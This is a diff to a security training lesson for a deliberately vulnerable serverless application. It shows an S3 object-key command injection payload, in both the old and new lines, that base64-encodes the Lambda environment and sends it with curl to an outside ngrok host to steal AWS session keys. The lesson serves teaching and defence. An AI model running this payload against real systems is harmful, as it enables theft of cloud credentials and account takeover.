@@ -7,7 +7,7 @@ Let's see what we can do with that:
 We already saw that one of the functions is vulnerable to command injection through an [insecure s3 configuration](../LESSONS/LESSON_04.md), so we can leverage that and steal the function's keys. By stealing the keys (AWS_SESSION_TOKEN, AWS_SECRET_ACCESS_KEY and AWS_ACCESS_KEY_ID), we will be able to assume the function's temporary execution role.
 
 ```
-aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;b=`env|base64 --wrap=0`;curl 0c971764.ngrok.io?data=$b;echo x.raw' --profile hacker
+aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;b=`env|base64 --wrap=0` --acl public-read;curl 0c971764.ngrok.io?data=$b;echo x.raw' --profile hacker
 ```
 
 It's not hard to find the relevant keys in the base64 string that we got:
